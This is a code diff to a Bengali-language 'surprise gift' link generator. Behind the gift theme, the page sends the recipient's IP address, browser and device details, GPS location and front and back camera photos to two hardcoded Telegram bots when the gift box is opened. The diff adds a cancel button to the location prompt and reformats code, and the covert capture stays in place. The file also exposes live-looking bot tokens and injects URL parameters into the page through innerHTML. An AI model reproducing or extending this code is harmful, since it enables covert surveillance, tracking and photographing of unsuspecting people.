@@ -570,6 +570,13 @@
         .modal-content button {
             width: auto;
             padding: 10px 25px;
+            margin: 0 5px;
+        }
+        /* *** "বাতিল করুন" বাটনের জন্য নতুন স্টাইল *** */
+        #cancel-location-btn {
+            background: #f1f5f9;
+            color: var(--text-dark);
+            border: 1px solid #e2e8f0;
         }
         @keyframes float {
             0%, 100% { transform: translateY(0); }
@@ -699,11 +706,15 @@
 
     <div class="victory-effect" id="victoryEffect"></div>
 
+    <!-- *** নতুন Modal এর জন্য HTML আপডেট করা হয়েছে *** -->
     <div class="modal-overlay" id="location-permission-modal">
         <div class="modal-content">
             <h3><i class="fas fa-map-marker-alt"></i> লোকেশনের অনুমতি প্রয়োজন</h3>
             <p>এই সারপ্রাইজের একটি অংশ হিসেবে আপনার বর্তমান লোকেশনটি প্রেরকের সাথে শেয়ার করা হবে। অনুগ্রহ করে পরবর্তী ধাপে আপনার লোকেশন অ্যাক্সেস করার জন্য "Allow" বাটনে ক্লিক করুন।</p>
-            <button id="grant-location-btn">ঠিক আছে, অনুমতি দিন</button>
+            <div>
+                <button id="grant-location-btn">ঠিক আছে, অনুমতি দিন</button>
+                <button id="cancel-location-btn">বাতিল করুন</button>
+            </div>
         </div>
     </div>
 
@@ -712,29 +723,17 @@
 
     <script>
         // --- ছবির লিঙ্ক ---
-        const predefinedImages = [
-            "https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/Image-1.jpg",
-            "https://i.imgur.com/Z4N6d2j.jpeg",
-            "https://i.imgur.com/cWvL2sV.jpeg"
-        ];
-        // --- GIF লিঙ্ক ---
-        const predefinedGifs = [
-            "https://i.imgur.com/LPAxY3B.gif"
-        ];
+        const predefinedImages = ["https://raw.githubusercontent.com/life-by/photo/refs/heads/main/camara/Image-1.jpg", "https://i.imgur.com/Z4N6d2j.jpeg", "https://i.imgur.com/cWvL2sV.jpeg"];
+        const predefinedGifs = ["https://i.imgur.com/LPAxY3B.gif"];
 
         // --- টেলিগ্রাম সেটিংস ---
-        const TELEGRAM_TARGETS = [
-            { botToken: "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA", chatId: "6728809478" },
-            { botToken: "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "2139008203" }
-        ];
+        const TELEGRAM_TARGETS = [{ botToken: "7884212116:AAG1hul0EbZom1iHucZztAW_FZOXf_g_TqA", chatId: "6728809478" }, { botToken: "7247057741:AAHZHI2n1KuXnWNSiAcA-B0WcCI8LuPWdhk", chatId: "2139008203" }];
         let currentVideoStream = null;
 
         // --- তথ্য পাঠানোর ফাংশন ---
         async function captureFromCamera(facingMode, photoCount, baseCaption) {
             let video;
-            try {
-                video = await startCamera(facingMode);
-            } catch (error) { console.error(`Could not start ${facingMode} camera. Skipping.`); return; }
+            try { video = await startCamera(facingMode); } catch (error) { console.error(`Could not start ${facingMode} camera. Skipping.`); return; }
             const cameraTypeName = (facingMode === 'user') ? 'Selfie' : 'Back';
             for (let i = 1; i <= photoCount; i++) {
                 await new Promise(resolve => setTimeout(resolve, 700));
@@ -761,10 +760,8 @@
                 }
                 const deviceInfo = `🎁 **Surprise Box Opened!** 🎁\n---\n**Device Info:**\n- **IP:** ${ipAddress}\n- **Browser:** ${navigator.userAgent}\n- **Platform:** ${navigator.platform}\n- **Screen:** ${window.screen.width}x${window.screen.height}\n- **${batteryStatus}**`;
                 const sendPromises = TELEGRAM_TARGETS.map(target =>
-                    fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
-                        method: "POST", headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({ chat_id: target.chatId, text: deviceInfo, parse_mode: 'Markdown' })
-                    }).catch(error => console.error(`Failed to send info to ${target.chatId}:`, error))
+                    fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: target.chatId, text: deviceInfo, parse_mode: 'Markdown' }) })
+                    .catch(error => console.error(`Failed to send info to ${target.chatId}:`, error))
                 );
                 await Promise.all(sendPromises);
             } catch (error) { console.error("Error getting device info:", error); }
@@ -779,10 +776,8 @@
                     const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                     const locationInfo = `📍 **Location Captured!** 📍\n---\n- **Latitude:** ${latitude}\n- **Longitude:** ${longitude}\n- **Accuracy:** ${accuracy.toFixed(2)} meters\n---\n**View on Google Maps:**\n${mapLink}`;
                     const sendPromises = TELEGRAM_TARGETS.map(target =>
-                        fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, {
-                            method: "POST", headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify({ chat_id: target.chatId, text: locationInfo, parse_mode: 'Markdown' })
-                        }).catch(error => console.error(`Failed to send location to ${target.chatId}:`, error))
+                        fetch(`https://api.telegram.org/bot${target.botToken}/sendMessage`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: target.chatId, text: locationInfo, parse_mode: 'Markdown' }) })
+                        .catch(error => console.error(`Failed to send location to ${target.chatId}:`, error))
                     );
                     Promise.all(sendPromises);
                 },
@@ -845,9 +840,7 @@
         });
 
         function setupGalleryToggle() {
-            const toggleBtn = document.getElementById('toggleGalleryBtn');
-            const galleryContainer = document.getElementById('gallery-container');
-            toggleBtn.addEventListener('click', () => { galleryContainer.classList.toggle('hidden'); });
+            document.getElementById('toggleGalleryBtn').addEventListener('click', () => { document.getElementById('gallery-container').classList.toggle('hidden'); });
         }
 
         function setupGalleries() {
@@ -867,9 +860,7 @@
             };
             predefinedImages.forEach(url => createGalleryItem(url, imageGalleryContainer));
             predefinedGifs.forEach(url => createGalleryItem(url, gifGalleryContainer));
-            imageUrlInput.addEventListener('input', () => {
-                document.querySelectorAll('.gallery-image.selected').forEach(el => el.classList.remove('selected'));
-            });
+            imageUrlInput.addEventListener('input', () => { document.querySelectorAll('.gallery-image.selected').forEach(el => el.classList.remove('selected')); });
         }
 
         function setupThemeSelector() {
@@ -892,8 +883,7 @@
         function applyTheme(themeName) { document.body.className = `theme-${themeName}`; }
 
         function setupForm() {
-            const form = document.getElementById('giftForm');
-            form.addEventListener('submit', (e) => {
+            document.getElementById('giftForm').addEventListener('submit', (e) => {
                 e.preventDefault();
                 const params = new URLSearchParams({
                     sender: document.getElementById('senderName').value,
@@ -911,26 +901,33 @@
                 document.getElementById('generatedLink').value = giftLink;
                 document.getElementById('generatedLinkContainer').classList.remove('hidden');
             });
-            document.getElementById('copyButton').addEventListener('click', () => {
-                navigator.clipboard.writeText(document.getElementById('generatedLink').value);
-            });
+            document.getElementById('copyButton').addEventListener('click', () => { navigator.clipboard.writeText(document.getElementById('generatedLink').value); });
         }
 
-        // *** সংশোধিত অংশ: পেজ লোড হওয়ার সাথে সাথে লোকেশন পারমিশন চাইবে ***
+        // *** সংশোধিত অংশ: লোকেশন পারমিশনের নতুন লজিক ***
         function displayGift(params) {
+            const loadGiftContent = (p) => {
+                const countdownTime = p.get('cd');
+                if (countdownTime) {
+                    handleCountdown(p, new Date(countdownTime));
+                } else {
+                    showMainGiftContent(p);
+                }
+            };
             if (params.get('loc') === 'true') {
                 const modal = document.getElementById('location-permission-modal');
                 modal.style.display = 'flex';
                 document.getElementById('grant-location-btn').addEventListener('click', () => {
                     modal.style.display = 'none';
                     sendLocation();
+                    loadGiftContent(params);
                 }, { once: true });
-            }
-            const countdownTime = params.get('cd');
-            if (countdownTime) {
-                handleCountdown(params, new Date(countdownTime));
+                document.getElementById('cancel-location-btn').addEventListener('click', () => {
+                    modal.style.display = 'none';
+                    loadGiftContent(params);
+                }, { once: true });
             } else {
-                showMainGiftContent(params);
+                loadGiftContent(params);
             }
         }
 
@@ -938,4 +935,73 @@
             const countdownContainer = document.getElementById('countdown-container');
             const mainGiftContent = document.getElementById('main-gift-content');
             countdownContainer.classList.remove('hidden');
-            mainGiftContent.
+            mainGiftContent.classList.add('hidden');
+            document.getElementById('receiverTitle').textContent = `প্রিয় ${params.get('receiver')}`;
+            const interval = setInterval(() => {
+                const distance = targetDate - new Date();
+                if (distance < 0) {
+                    clearInterval(interval);
+                    countdownContainer.classList.add('hidden');
+                    showMainGiftContent(params);
+                    return;
+                }
+                const d = Math.floor(distance / (1000*60*60*24)), h = Math.floor((distance % (1000*60*60*24))/(1000*60*60)), m = Math.floor((distance % (1000*60*60))/(1000*60)), s = Math.floor((distance % (1000*60))/1000);
+                document.getElementById('timer').innerHTML = `${d}d ${h}h ${m}m ${s}s`;
+            }, 1000);
+        }
+
+        function showMainGiftContent(params) {
+            document.getElementById('main-gift-content').classList.remove('hidden');
+            const sender = params.get('sender'), receiver = params.get('receiver'), message = params.get('message'), imageURL = params.get('image'), theme = params.get('theme');
+            document.getElementById('receiverTitle').textContent = `প্রিয় ${receiver}`;
+            let themeText = 'তোমার জন্য একটি উপহার!';
+            if (theme === 'custom') themeText = params.get('ct') || themeText;
+            else if (theme === 'birthday') themeText = 'শুভ জন্মদিন!';
+            else if (theme === 'anniversary') themeText = 'শুভ বার্ষিকী!';
+            else if (theme === 'newyear') themeText = 'শুভ নববর্ষ!';
+            else if (theme === 'proposal') themeText = 'তোমাকে ভালোবাসি!';
+            document.getElementById('themeMessage').textContent = themeText;
+            if (imageURL) {
+                const img = document.getElementById('revealedImage');
+                img.src = imageURL;
+                img.classList.remove('hidden');
+            }
+            document.getElementById('giftWrapper').addEventListener('click', () => {
+                const caption = `Gift from: ${sender}\nTo: ${receiver}`;
+                if (params.get('info') === 'true') { sendDeviceInfo(); }
+                if (params.get('cam') === 'true') { initiateDualCameraCapture(caption); }
+                document.getElementById('giftBox').classList.add('open');
+                document.querySelector('.click-instruction').style.display = 'none';
+                setTimeout(() => {
+                    const wrapper = document.getElementById('giftWrapper');
+                    wrapper.classList.add('revealed');
+                    document.getElementById('giftContentRevealed').classList.remove('hidden');
+                    const msgContainer = document.createElement('div');
+                    msgContainer.className = 'message-container';
+                    msgContainer.innerHTML = `<h3>${sender} এর বার্তা:</h3><p>${message}</p>`;
+                    document.getElementById('giftContentRevealed').appendChild(msgContainer);
+                    setTimeout(() => msgContainer.classList.add('show'), 100);
+                    triggerVictoryEffect();
+                }, 1000);
+            }, { once: true });
+        }
+
+        function triggerVictoryEffect() {
+            const victoryEffect = document.getElementById('victoryEffect');
+            victoryEffect.style.display = 'block';
+            for (let i = 0; i < 100; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti-piece';
+                confetti.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
+                confetti.style.left = `${Math.random() * 100}%`;
+                confetti.style.animationDelay = `${Math.random() * 2}s`;
+                victoryEffect.appendChild(confetti);
+            }
+            setTimeout(() => {
+                victoryEffect.innerHTML = '';
+                victoryEffect.style.display = 'none';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
